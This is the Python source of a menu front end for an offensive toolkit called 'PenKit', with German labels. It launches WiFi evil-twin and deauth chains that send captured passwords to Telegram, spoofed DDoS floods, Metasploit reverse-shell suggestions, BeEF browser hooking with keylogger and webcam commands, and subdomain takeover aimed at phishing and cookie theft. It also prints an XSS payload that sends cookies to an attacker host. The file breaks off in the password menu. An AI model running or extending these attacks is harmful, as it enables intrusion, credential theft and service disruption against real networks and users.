#!/usr/bin/env python3
"""
PenKit Classic Menu — terminal-native numbered interface.
No dependencies beyond Python stdlib + tool modules.
"""

import os
import sys
import asyncio
import time
import random

# ── ANSI colours ──────────────────────────────────────────────────────────────
R  = "\033[0m"          # reset
G  = "\033[92m"         # bright green
DG = "\033[32m"         # dark green
C  = "\033[96m"         # cyan
Y  = "\033[93m"         # yellow
RD = "\033[91m"         # red
W  = "\033[97m"         # white
DIM= "\033[2m"          # dim
B  = "\033[1m"          # bold
BL = "\033[5m"          # blink

def clr():
    os.system("clear" if os.name != "nt" else "cls")

def slow(text: str, delay: float = 0.018):
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def banner():
    clr()
    from core.anon import status_line
    art = f"""
{DG}  ██████╗ ███████╗███╗   ██╗██╗  ██╗██╗████████╗
{G}  ██╔══██╗██╔════╝████╗  ██║██║ ██╔╝██║╚══██╔══╝
{G}  ██████╔╝█████╗  ██╔██╗ ██║█████╔╝ ██║   ██║
{G}  ██╔═══╝ ██╔══╝  ██║╚████║██╔═██╗ ██║   ██║
{DG}  ██║     ███████╗██║ ╚███║██║  ██╗██║   ██║
{DG}  ╚═╝     ╚══════╝╚═╝  ╚══╝╚═╝  ╚═╝╚═╝   ╚═╝{R}
{DIM}  ┌────────────────────────────────────────────────────────┐{R}
{DIM}  │  {R}{C}Authorized Pentesting Toolkit  v3.0{R}{DIM}                    │{R}
{DIM}  │  {R}{DG}? = Assistent  |  T = Tutorials  |  H = Health Check{R}{DIM}   │{R}
{DIM}  └────────────────────────────────────────────────────────┘{R}
"""
    print(art)
    print(status_line())
    print()


def print_ascii_art(art: str, color: str = ""):
    c = color or "\033[32m"
    for line in art.strip().split("\n"):
        print(f"  {c}{line}\033[0m")

def section(title: str, subtitle: str = ""):
    w = 70
    print(f"\n{G}╔{'═'*(w-2)}╗{R}")
    print(f"{G}║{B}{title.center(w-2)}{R}{G}║{R}")
    if subtitle:
        print(f"{G}║{DIM}{subtitle.center(w-2)}{R}{G}║{R}")
    print(f"{G}╚{'═'*(w-2)}╝{R}\n")

def info_box(lines: list[str]):
    """Prints a dim info box — used to explain what a field means."""
    w = 68
    print(f"  {DIM}┌{'─'*(w-2)}┐{R}")
    for line in lines:
        padded = f"  {line}"
        print(f"  {DIM}│{R}{DIM}{padded:<{w-2}}{R}{DIM}│{R}")
    print(f"  {DIM}└{'─'*(w-2)}┘{R}")

def menu_item(num: str, label: str, danger: str = "", hint: str = ""):
    color = {"🟢": DG, "🟡": Y, "🟠": Y, "🔴": RD, "⛔": RD}.get(danger, G)
    hint_str = f"  {DIM}{hint}{R}" if hint else ""
    print(f"  {DIM}[{R}{G}{B}{num:>2}{R}{DIM}]{R}  {color}{B}{label}{R}{hint_str}  {danger}")

def prompt(text: str = "penkit") -> str:
    try:
        return input(f"\n{G}┌─[{C}{text}{G}]\n└─▶ {W}").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return "0"

def wait_key():
    input(f"\n{DIM}  [Press Enter to continue...]{R}")

def print_output_line(line: str):
    line = line.strip()
    if not line:
        return
    if "[+]" in line or "FOUND" in line or "SUCCESS" in line or "CRACKED" in line:
        print(f"  {G}✓  {line}{R}")
    elif "[ERROR]" in line or "ERROR" in line:
        print(f"  {RD}✗  {line}{R}")
    elif "[!]" in line or "WARN" in line or "THREAT" in line:
        print(f"  {Y}!  {line}{R}")
    elif "[*]" in line:
        print(f"  {C}→  {line}{R}")
    elif "═" in line or "─" in line:
        print(f"  {DG}{line}{R}")
    else:
        print(f"  {DIM}{line}{R}")

async def run_tool_live(gen):
    """Stream async generator output to terminal."""
    try:
        async for line in gen:
            print_output_line(line)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user{R}")

# ── Tool input helpers ────────────────────────────────────────────────────────

def ask(label: str, default: str = "", required: bool = False) -> str:
    default_hint = f" [{DIM}{default}{R}]" if default else ""
    val = input(f"  {C}{label}{default_hint}: {W}").strip()
    if not val and default:
        return default
    if not val and required:
        print(f"  {RD}Required!{R}")
        return ask(label, default, required)
    return val

def ask_int(label: str, default: int) -> int:
    val = ask(label, str(default))
    try:
        return int(val)
    except ValueError:
        return default

# ═════════════════════════════════════════════════════════════════════════════
# MENUS
# ═════════════════════════════════════════════════════════════════════════════

async def menu_wifi():
    from tools.wifi import WifiScanner, HandshakeCapture, PMKIDAttack, DeauthFlood, EvilTwin
    from tools.wifi import WPSScanner, PixieDust, ReaverBrute, BeaconFlood
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("📡  WiFi ATTACKS", "WPA2/3 · WPS · Handshake · Evil Twin · Deauth · Beacon Flood")
        menu_item("1", "WiFi Scanner",               "🟡", "Scant alle APs + WPS-Status + Signal")
        menu_item("2", "Handshake Capture",          "🟠", "WPA2-Handshake für hashcat/aircrack")
        menu_item("3", "PMKID Attack",               "🟠", "Clientless WPA2-Angriff — kein Client nötig")
        menu_item("4", "Deauth Flood",               "🔴", "Clients vom Netz trennen")
        menu_item("5", "Evil Twin + Portal",         "🔴", "Fake-AP + Captive Portal → Passwort")
        menu_item("6", "WPS Scan",                   "🟡", "Findet WPS-fähige Router (wash)")
        menu_item("7", "Pixie-Dust Attack",          "🔴", "WPS-PIN in Sekunden offline cracken")
        menu_item("8", "Reaver WPS Brute-Force",     "🔴", "WPS online brute-force (2-10h)")
        menu_item("9", "Beacon Flood",               "🟠", "Tausende Fake-SSIDs senden (mdk4)")
        menu_item("A", "AUTO-CRACK PIPELINE",        "🔴", "Capture → Deauth → Handshake → Crack in einem Schritt")
        menu_item("C", "🔥  AUTO-COMBO (NEU!)",     "⛔", "Deauth + Evil Twin + Captive Portal + Verify + Telegram-Alert")
        menu_item("0", "Back")

        choice = prompt("wifi")
        if choice == "0":
            return

        clr()
        if choice == "1":
            iface = ask("Interface", cfg.get("interface", "wlan0"))
            t = WifiScanner(iface)
            print(f"\n{G}[*] Starting... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.enable_monitor())
                await run_tool_live(t.scan())
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "2":
            iface = ask("Monitor interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid = ask("Target BSSID (AA:BB:CC:DD:EE:FF)", required=True)
            channel = ask("Channel", "6")
            t = HandshakeCapture(iface, cfg.get("output_dir", "/tmp"))
            print(f"\n{G}[*] Capturing... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.capture(bssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            iface = ask("Interface", cfg.get("interface", "wlan0"))
            bssid = ask("Target BSSID (empty = all APs)", "")
            t = PMKIDAttack(iface, cfg.get("output_dir", "/tmp"))
            try:
                await run_tool_live(t.capture(bssid))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            iface = ask("Monitor interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid = ask("Target BSSID", required=True)
            client = ask("Client MAC", "FF:FF:FF:FF:FF:FF")
            count = ask_int("Count (0=continuous)", 0)
            t = DeauthFlood(iface)
            print(f"\n{RD}[!] Deauthing {bssid}... Ctrl+C to stop{R}\n")
            try:
                await run_tool_live(t.flood(bssid, client, count))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            iface = ask("Interface", "wlan0")
            ssid = ask("Target SSID to clone", required=True)
            channel = ask("Channel", "6")
            t = EvilTwin(iface, cfg.get("output_dir", "/tmp"))
            try:
                await run_tool_live(t.start(ssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "6":
            section("WPS SCANNER", "Zeigt alle APs mit aktivem WPS")
            info_box([
                "wash scannt nach WPS-fähigen APs.",
                "Locked=No → Pixie-Dust oder Reaver möglich",
                "Locked=Yes → Router hat WPS nach Fehlversuchen gesperrt",
            ])
            iface = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            timeout = ask_int("Scan-Dauer (Sekunden)", 30)
            t = WPSScanner(iface)
            try:
                await run_tool_live(t.scan(timeout))
            except KeyboardInterrupt:
                pass

        elif choice == "7":
            section("PIXIE-DUST ATTACK", "WPS-PIN offline cracken — keine Brute-Force nötig")
            info_box([
                "Pixie-Dust nutzt schwache Zufallszahlen in WPS-Implementierungen.",
                "Funktioniert bei ~25% aller Router. Ergebnis in 1-60 Sekunden.",
                "Monitor-Mode muss aktiv sein (airmon-ng start wlan0).",
                "BSSID: MAC-Adresse des Routers (z.B. AA:BB:CC:DD:EE:FF)",
            ])
            iface   = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid   = ask("Ziel BSSID", required=True)
            channel = ask("Kanal", "6")
            t = PixieDust(iface)
            try:
                await run_tool_live(t.attack(bssid, channel))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "8":
            section("REAVER WPS BRUTE-FORCE", "Online-Angriff — probiert alle WPS-PINs durch")
            info_box([
                "WARNUNG: Dauert 2-10 Stunden. Fortschritt wird automatisch gespeichert.",
                "Viele Router sperren WPS nach mehreren Fehlversuchen (WPS Lock).",
                "Delay = Wartezeit zwischen Versuchen (empfohlen: 1-2 Sekunden).",
                "Reaver macht automatisch Pause bei Rate-Limiting.",
            ])
            iface   = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid   = ask("Ziel BSSID", required=True)
            channel = ask("Kanal", "6")
            delay   = float(ask("Delay zwischen Versuchen (Sek)", "1.0"))
            t = ReaverBrute(iface)
            try:
                await run_tool_live(t.attack(bssid, channel, delay))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "9":
            section("BEACON FLOOD", "Überschwemmt WiFi-Radar mit Fake-SSIDs")
            info_box([
                "Sendet hunderte gefälschte Beacon-Frames mit verschiedenen SSIDs.",
                "Alle Geräte in Reichweite sehen diese Netzwerke.",
                "Gut für: Ablenkung während Evil-Twin läuft.",
                "Benötigt: mdk4 (apt install mdk4)",
            ])
            iface  = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            count  = ask_int("Anzahl Fake-SSIDs", 200)
            custom = ask("Eigene SSIDs (kommagetrennt, leer=zufällig)", "")
            ssid_list = [s.strip() for s in custom.split(",") if s.strip()] if custom else None
            t = BeaconFlood(iface)
            try:
                await run_tool_live(t.flood(ssid_list, count))
            except KeyboardInterrupt:
                await t.stop()

        elif choice in ("a", "A"):
            section("AUTO-CRACK PIPELINE", "Capture → Deauth → Handshake erkannt → Convert → Hashcat")
            info_box([
                "Vollautomatisch: Du gibst BSSID + Kanal ein — der Rest passiert alleine.",
                "  1. Startet airodump-ng (Capture)",
                "  2. Sendet Deauth-Pakete (zwingt Client zur Neuverbindung)",
                "  3. Erkennt Handshake automatisch",
                "  4. Konvertiert zu hashcat .hc22000 Format",
                "  5. Crackt mit Wordlist",
                "Alle Dateien → ~/penkit-output/wifi/",
            ])
            iface    = ask("Monitor Interface", cfg.get("monitor_interface", "wlan0mon"))
            bssid    = ask("Ziel BSSID", required=True)
            channel  = ask("Kanal", "6")
            wordlist = ask("Wordlist", cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
            t = HandshakeCapture(iface)
            print()
            try:
                await run_tool_live(t.auto_crack_pipeline(bssid, channel, wordlist))
            except KeyboardInterrupt:
                await t.stop()

        elif choice in ("c", "C"):
            banner()
            section("🔥  WIFI AUTO-COMBO", "Deauth + Evil Twin + Portal + Verify + Telegram")
            info_box([
                "Vollautomatische Angriffskette:",
                "  1. Fake AP mit identischer SSID starten",
                "  2. Clients vom echten AP deauthen (zwingen sich zu verbinden)",
                "  3. Captive Portal: Opfer sieht Passwort-Dialog",
                "  4. Passwort wird sofort angezeigt + optional per Telegram gesendet",
                "  5. Passwort gegen echten AP verifizieren",
                "",
                "Wann klappt es:",
                "  ✓ Wenn Signal des Fake-APs mindestens gleich stark",
                "  ✓ Bei WPA2-PSK Netzwerken (Heimnetz, Büro)",
                "  ✗ Bei WPA3, Enterprise-Auth, wenn Nutzer BSSID manuell prüft",
            ])
            print()
            iface = ask("WiFi Interface (AP-Modus)", cfg.get("interface", "wlan0"))
            print(f"  {DIM}Tipp: Option C (Scan) aus WiFi-Menü → BSSID/Kanal aus Ergebnis kopieren{R}")
            ssid    = ask("Ziel SSID (exakt!)", required=True)
            bssid   = ask("Ziel BSSID (AA:BB:CC:DD:EE:FF)", required=True)
            channel = ask("Kanal", "6")
            client  = ask("Client BSSID (leer = alle deauthen)", "FF:FF:FF:FF:FF:FF")
            tg_tok  = ask("Telegram Bot-Token (leer = ohne Alert)", "")
            tg_chat = ask("Telegram Chat-ID", "") if tg_tok else ""
            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
                wait_key(); continue
            print()
            try:
                from tools.wifi.auto_combo import WiFiAutoCombo
                combo = WiFiAutoCombo(iface, tg_tok, tg_chat)
                await run_tool_live(combo.run_combo(ssid, bssid, channel, client))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        wait_key()


async def menu_network():
    from tools.network import NetworkScanner
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("🌐  NETWORK INTELLIGENCE", "Scan · Topology · CVE · IoT · DDoS")
        menu_item(" 1", "🔍  Quick Host Discovery",    "🟡", "Aktive Hosts im Netzwerk finden")
        menu_item(" 2", "🗺️   Full Scan + Attack Chain","🟠", "Ports + Services + CVEs + Exploit-Vorschläge")
        menu_item(" 3", "🕵️   Stealth Scan",            "🟠", "SYN-Scan, langsam, weniger auffällig")
        menu_item(" 4", "💾  Export letzten Scan",     "🟢", "JSON-Export der Scan-Ergebnisse")
        menu_item(" 5", "📡  IoT Scanner",             "🔴", "Router/Kameras/NAS finden + Default-Creds testen")
        menu_item(" 6", "💥  DDoS / Stress-Test",      "⛔", "Slowloris, HTTP Flood, hping3 SYN-Flood")
        menu_item(" 7", "🎯  Auto-Exploit Suggester",  "🔴", "nmap CVE → fertige Metasploit-Befehle")
        menu_item(" 8", "⚡  Quick Vuln Check",        "🔴", "EternalBlue/BlueKeep/Heartbleed in 60 Sek")
        menu_item(" 0", "← Zurück", "")

        choice = prompt("network")
        if choice == "0":
            return

        clr()
        scanner = NetworkScanner(cfg.get("output_dir", "/tmp"))

        if choice == "1":
            target = ask("Target CIDR or IP (empty = auto-detect)", "")
            try:
                await run_tool_live(scanner.discover_hosts(target))
            except KeyboardInterrupt:
                await scanner.stop()

        elif choice in ("2", "3"):
            target = ask("Target CIDR or IP (empty = auto-detect)", "")
            stealth = (choice == "3")
            print(f"\n{G}[*] Full scan running... this takes a few minutes{R}\n")
            try:
                await run_tool_live(scanner.full_scan(target, stealth=stealth))
            except KeyboardInterrupt:
                await scanner.stop()

        elif choice == "4":
            path = await scanner.export_json()
            if path:
                print(f"\n{G}[+] Exported: {path}{R}")
            else:
                print(f"\n{Y}[!] No scan data. Run a scan first.{R}")

        elif choice == "5":
            banner()
            section("📡  IOT SCANNER", "Router · Kameras · NAS · Smart Home")
            info_box([
                "Scannt nach IoT-Geräten im Netzwerk:",
                "  → Erkennt Hersteller + Modell automatisch",
                "  → Testet 60+ Default-Credential-Kombinationen",
                "  → Prüft HTTP Basic Auth + Form-Login + Telnet",
                "",
                "Beispiele für target:",
                "  192.168.1.0/24   — komplettes Heimnetz",
                "  192.168.1.1      — einzelner Router",
                "  10.0.0.0/24      — anderes Subnetz",
            ])
            print()
            target = ask("Ziel (IP oder CIDR)", "192.168.1.0/24")
            if not target:
                wait_key(); continue
            print(f"\n  {RD}🔴  Nur im eigenen / autorisierten Netzwerk!{R}\n")
            try:
                from tools.network.iot_scanner import IoTScanner
                scanner_iot = IoTScanner(target)
                await run_tool_live(scanner_iot.scan())
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        elif choice == "6":
            banner()
            section("💥  DDOS / STRESS-TEST", "Nur eigene / autorisierte Server!")
            info_box([
                "⛔  WARNUNG: DDoS-Angriffe auf fremde Server sind in Deutschland strafbar (§303b StGB).",
                "    Nur für: eigene Server-Tests, autorisierte Pentests, Lernzwecke im eigenen Netz.",
            ])
            print()
            menu_item(" 1", "🐌  Slowloris",      "⛔", "Hält HTTP-Verbindungen offen → Server-Threads erschöpft")
            menu_item(" 2", "🌊  HTTP Flood",      "⛔", "Asyncio GET-Flood → maximale Requests/sec")
            menu_item(" 3", "💀  hping3 SYN-Flood","⛔", "Kernel-level SYN-Flood mit gefälschten IPs")
            menu_item(" 0", "← Zurück", "")
            print()
            dchoice = prompt("ddos")

            if dchoice == "0":
                wait_key(); continue

            host = ask("Ziel-Host / IP", required=True)
            try:
                port = int(ask("Port", "80"))
            except ValueError:
                port = 80
            try:
                duration = int(ask("Dauer in Sekunden", "60"))
            except ValueError:
                duration = 60

            print(f"\n  {RD}⛔  Tippe:{R}  {W}I confirm authorized use{R}\n")
            if prompt("Bestätigung").strip().lower() != "i confirm authorized use":
                print(f"  {Y}[!] Abgebrochen.{R}")
                wait_key(); continue

            print()
            try:
                if dchoice == "1":
                    from tools.network.ddos import Slowloris
                    try:
                        socks = int(ask("Anzahl Sockets", "200"))
                    except ValueError:
                        socks = 200
                    use_https = ask("HTTPS? [j/n]", "n").lower() in ("j", "y")
                    sl = Slowloris(host, port, socks, duration=duration, use_https=use_https)
                    await run_tool_live(sl.run())

                elif dchoice == "2":
                    from tools.network.ddos import HTTPFlood
                    proto = "https" if port in (443, 8443) else "http"
                    url   = ask("Ziel-URL", f"{proto}://{host}:{port}/")
                    try:
                        workers = int(ask("Worker-Anzahl (parallele Requests)", "100"))
                    except ValueError:
                        workers = 100
                    hf = HTTPFlood(url, workers=workers, duration=duration)
                    await run_tool_live(hf.run())

                elif dchoice == "3":
                    from tools.network.ddos import HpingFlood
                    mode = ask("Modus [syn/udp/icmp/ack]", "syn")
                    spoof = ask("Zufällige Quell-IP (Spoofing)? [j/n]", "j").lower() in ("j", "y")
                    hpf = HpingFlood(host, port, mode, duration, spoof_src=spoof)
                    await run_tool_live(hpf.run())

            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        elif choice == "7":
            banner()
            section("🎯  AUTO-EXPLOIT SUGGESTER", "nmap CVE → Metasploit-Befehle")
            info_box([
                "Läuft nmap mit vulners + exploit Scripts:",
                "  → Findet CVEs mit CVSS Score",
                "  → Sucht passende Metasploit-Module (searchsploit)",
                "  → Generiert fertige msfconsole-Befehle",
                "  → Sortiert nach Kritikalität (Critical → High → Medium)",
                "",
                "Benötigt: nmap, searchsploit (exploitdb-package)",
                "Install:  apt install exploitdb",
                "          nmap --script-updatedb",
            ])
            print()
            target = ask("Ziel IP / Hostname", required=True)
            if not target:
                wait_key(); continue
            lhost = ask("Deine IP (LHOST für Reverse Shell)", "10.10.10.1")
            ports = ask("Port-Range", "1-10000")
            print(f"\n  {RD}🔴  Nur gegen autorisierte Ziele!{R}\n")
            try:
                from tools.network.auto_exploit import run_auto_exploit
                await run_tool_live(run_auto_exploit(target, lhost, ports))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        elif choice == "8":
            banner()
            section("⚡  QUICK VULN CHECK", "Kritische Exploits in 60 Sek")
            info_box([
                "Schnellcheck der gefährlichsten bekannten Schwachstellen:",
                "  → EternalBlue (MS17-010) — WannaCry / NotPetya",
                "  → BlueKeep (CVE-2019-0708) — RDP Pre-Auth RCE",
                "  → Heartbleed — SSL Speicher-Leak",
                "  → Shellshock — Apache CGI RCE",
                "  → SMBGhost (CVE-2020-0796) — SMB3 RCE",
                "",
                "Ausgabe: VERWUNDBAR / kein Ergebnis + fertiger MSF-Befehl",
            ])
            print()
            target = ask("Ziel IP / Hostname", required=True)
            if not target:
                wait_key(); continue
            lhost = ask("Deine IP (LHOST)", "10.10.10.1")
            print()
            try:
                from tools.network.auto_exploit import quick_exploit_check
                await run_tool_live(quick_exploit_check(target, lhost))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        wait_key()


async def menu_web():
    from tools.web import WebFingerprinter, SmartFuzzer, SQLInjector, WebVulnScanner
    from core.config import load
    cfg = load()

    while True:
        banner()
        section("💻  WEB ATTACK", "Recon · Fuzzing · SQLi · XSS · Browser Exploitation")
        menu_item(" 1", "🔍  Fingerprint Target",          "🟡", "CMS, WAF, Server, Technologien erkennen")
        menu_item(" 2", "📂  Directory Fuzzer (ffuf)",     "🟠", "Versteckte Pfade, Admin-Panels, Backups")
        menu_item(" 3", "💉  SQL Injection (sqlmap)",      "🟠", "Auto-SQLi Erkennung + Datenbank-Dump")
        menu_item(" 4", "🔬  Vuln Scan (nikto + nuclei)",  "🟠", "Bekannte CVEs, Fehlkonfigurationen")
        menu_item(" 5", "🔗  Full Auto Chain",             "🟠", "Fingerprint → Fuzz → SQLi → Vuln Scan")
        menu_item(" 6", "🪝  BeEF Browser Exploitation",   "⛔", "Browser hooken, Keylogger, Screenshot, Webcam")
        menu_item(" 7", "💥  XSS Scanner (dalfox)",        "🔴", "reflektiert + DOM + Blind XSS, WAF-Bypass")
        menu_item(" 8", "🎯  XSS Payload-Tester",          "🔴", "Payload-Bibliothek gegen URL testen")
        menu_item(" 9", "🍪  Cookie-Catcher starten",      "🔴", "Empfängt XSS-Callbacks (Cookies, Keys)")
        menu_item(" X", "📋  XSS Payloads anzeigen",       "🟡", "Alle Contexts: HTML, Attr, JS, WAF-Bypass")
        menu_item(" S", "🏴‍☠️  Subdomain Takeover",          "🔴", "CNAME → tote Dienste → eigene Page platzieren")
        menu_item(" 0", "← Zurück", "")

        choice = prompt("web")
        if choice == "0":
            return

        clr()

        if choice in ("1","2","3","4","5"):
            url = ask("Target URL (https://...)", required=True)

        if choice == "1":
            t = WebFingerprinter()
            await run_tool_live(t.fingerprint(url))

        elif choice == "2":
            ext = ask("Extensions", "php,html,txt,js")
            fs  = ask("Filter size (noise, empty=off)", "")
            t = SmartFuzzer()
            try:
                await run_tool_live(t.fuzz_dirs(url, extensions=ext, filter_size=fs))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "3":
            waf = ask("WAF type (cloudflare/modsecurity, empty=auto)", "")
            t = SQLInjector()
            try:
                await run_tool_live(t.detect(url, waf))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "4":
            t = WebVulnScanner()
            try:
                await run_tool_live(t.full_scan(url))
            except KeyboardInterrupt:
                await t.stop()

        elif choice == "5":
            print(f"\n{G}[*] Phase 1: Fingerprint{R}")
            fp = WebFingerprinter(); await run_tool_live(fp.fingerprint(url))
            print(f"\n{G}[*] Phase 2: Fuzz{R}")
            fz = SmartFuzzer()
            try:
                await run_tool_live(fz.fuzz_dirs(url))
            except KeyboardInterrupt:
                pass
            print(f"\n{G}[*] Phase 3: Vuln Scan{R}")
            sc = WebVulnScanner()
            try:
                await run_tool_live(sc.nuclei_scan(url))
            except KeyboardInterrupt:
                pass

        elif choice == "7":
            banner()
            section("💥  XSS SCANNER", "dalfox — reflektiert + DOM + Blind XSS")
            info_box([
                "dalfox ist der schnellste XSS-Scanner:",
                "  → Reflektiertes XSS in URL-Parametern",
                "  → DOM-basiertes XSS",
                "  → Blind XSS (mit Callback-URL)",
                "  → WAF-Evasion eingebaut",
                "",
                "Install: apt install dalfox",
            ])
            print()
            url = ask("Ziel-URL (https://example.com/page?q=test)", required=True)
            if not url:
                wait_key(); continue
            param = ask("Parameter (leer = alle testen)", "")
            cookie = ask("Cookie (leer = ohne)", "")
            blind = ask("Blind XSS Callback-URL (leer = aus)", "")
            print()
            from tools.web.xss_engine import dalfox_scan
            try:
                await run_tool_live(dalfox_scan(url, param, cookie, blind=blind))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "8":
            banner()
            section("🎯  XSS PAYLOAD-TESTER", "Eigene Payload-Bibliothek gegen Ziel testen")
            info_box([
                "Testet vordefinierte Payloads gegen URL + Parameter.",
                "Erkennt ob Payload im Response reflektiert wird.",
                "",
                "Contexts:",
                "  html_basic  — direktes HTML (Standard)",
                "  attribute   — in HTML-Attributen",
                "  js_string   — in JavaScript-Strings",
                "  waf_bypass  — WAF-Bypass Varianten",
                "  dom_xss     — DOM-basiert (#fragment)",
            ])
            print()
            url = ask("Ziel-URL", required=True)
            if not url:
                wait_key(); continue
            param = ask("Parameter-Name (z.B. 'q', 'search', 'id')", "q")
            ctx = ask("Context [html_basic/attribute/js_string/waf_bypass/dom_xss]", "html_basic")
            print()
            from tools.web.xss_engine import test_payloads
            try:
                await run_tool_live(test_payloads(url, param, ctx))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice == "9":
            banner()
            section("🍪  COOKIE-CATCHER", "XSS-Callbacks empfangen")
            info_box([
                "Startet HTTP-Server der XSS-Payloads abrufen:",
                "  → Cookies (document.cookie)",
                "  → Keylogger-Daten",
                "  → Beliebige Daten via fetch/img-src",
                "",
                "Payload-Beispiel:",
                "  <script>new Image().src='http://<kali>:8080/?c='+document.cookie</script>",
            ])
            print()
            try:
                port = int(ask("Port", "8080"))
            except ValueError:
                port = 8080
            print()
            from tools.web.xss_engine import start_cookie_catcher
            try:
                await run_tool_live(start_cookie_catcher(port))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")

        elif choice in ("x", "X"):
            banner()
            section("📋  XSS PAYLOAD-BIBLIOTHEK", "Alle Payloads nach Context")
            kali_ip = ask("Deine Kali IP (für Cookie-Steal Payloads)", "10.10.10.1")
            print()
            from tools.web.xss_engine import show_payloads
            await run_tool_live(show_payloads("all", kali_ip))

        elif choice in ("s", "S"):
            banner()
            section("🏴‍☠️  SUBDOMAIN TAKEOVER", "CNAME → nicht mehr existierende Dienste → übernehmen")
            info_box([
                "Prüft ob Subdomains auf tote externe Dienste zeigen:",
                "  GitHub Pages, Netlify, Heroku, Vercel, AWS S3, Azure,",
                "  Shopify, Zendesk, Fastly, WordPress.com, Steam, ...",
                "",
                "Wenn JA → du kannst diese Subdomain selbst belegen:",
                "  → Phishing-Seite auf sub.opfer.com hosten",
                "  → Cookies der Hauptdomain stehlen (same-origin!)",
                "  → Vertrauenswürdige Domain missbrauchen",
                "",
                "Braucht: dig + optional subfinder (apt install subfinder)",
            ])
            print()
            domain = ask("Ziel-Domain (firma.com)", required=True)
            if not domain:
                wait_key(); continue
            sub_file = ask("Eigene Subdomain-Liste (leer = auto via crt.sh)", "")
            print()
            try:
                from tools.web.subdomain_takeover import scan as takeover_scan
                await run_tool_live(takeover_scan(domain, sub_file))
            except KeyboardInterrupt:
                print(f"\n  {Y}[!] Gestoppt.{R}")
            except Exception as e:
                print(f"  {RD}[!] {e}{R}")

        elif choice == "6":
            banner()
            section("🪝  BEEF BROWSER EXPLOITATION", "Browser hooken via JavaScript")
            info_box([
                "BeEF hookt Browser über eine einzige JS-Zeile:",
                "  <script src='http://<KALI-IP>:3000/hook.js'></script>",
                "",
                "Wege zum Einschleusen:",
                "  A) XSS: in Kommentar/Suchfeld/URL-Parameter einbetten",
                "  B) MITM: bettercap injiziert Hook automatisch (Tools → MITM)",
                "  C) Phishing-Seite: in HTML der Fake-Login-Page einbauen",
                "",
                "Nach dem Hooking: vollständige Browser-Kontrolle.",
            ])
            print()
            menu_item(" 1", "▶  BeEF starten",              "🔴", "Startet beef-xss im Hintergrund")
            menu_item(" 2", "📋  Hook-Payloads anzeigen",   "🟡", "XSS-Payload, Script-Tag, MITM-Befehl")
            menu_item(" 3", "🖥️   Gehookte Browser anzeigen","🟡", "Wer ist gerade gehookt + Browser-Info")
            menu_item(" 4", "💻  Befehl ausführen",         "⛔", "Keylogger, Screenshot, Webcam, Cookies...")
            menu_item(" 0", "← Web-Menü", "")
            print()
            bchoice = prompt("beef")

            if bchoice == "1":
                from tools.web.beef_engine import BeEFEngine
                await run_tool_live(BeEFEngine().start_beef())

            elif bchoice == "2":
                kali_ip = ask("Deine Kali IP", "192.168.1.10")
                from tools.web.beef_engine import BeEFEngine
                await run_tool_live(BeEFEngine().get_hook_payloads(kali_ip))

            elif bchoice == "3":
                from tools.web.beef_engine import BeEFEngine
                await run_tool_live(BeEFEngine().list_hooked_browsers())

            elif bchoice == "4":
                from tools.web.beef_engine import BeEFEngine, COMMANDS
                session_id = ask("Session-ID (aus Option 3)")
                if not session_id:
                    wait_key(); continue
                print()
                for i, (key, info) in enumerate(COMMANDS.items(), 1):
                    print(f"  {DIM}[{i:>2}]{R}  {G}{info['label']}{R}")
                print()
                cmd_num = ask("Nummer")
                try:
                    cmd_key = list(COMMANDS.keys())[int(cmd_num) - 1]
                    await run_tool_live(BeEFEngine().run_command(session_id, cmd_key))
                except (ValueError, IndexError):
                    print(f"  {Y}[!] Ungültige Auswahl{R}")

        wait_key()


async def menu_passwords():
    from tools.passwords import HashcatCracker, JohnCracker, detect_hash
    from tools.passwords.hydra import HydraCracker
    from core.config import load
    cfg = load()
    wl = cfg.get("wordlist", "/usr/share/wordlists/rockyou.txt")

    while True:
        banner()
        section("🔑  PASSWORDS & HASHES", "Hashcat GPU · John · Hydra · Smart Wordlist")
        menu_item("1", "Hash-Typ erkennen",           "🟢", "21 Typen: MD5, SHA, NTLM, bcrypt...")
        menu_item("2", "Hash cracken — Hashcat (GPU)","🟡", "GPU-beschleunigt, schnellste Methode")
        menu_item("3", "Hash cracken — John",         "🟡", "CPU-basiert, viele Formate")
        menu_item("4", "WPA2 .cap cracken",           "🟡", "Handshake → Passwort")
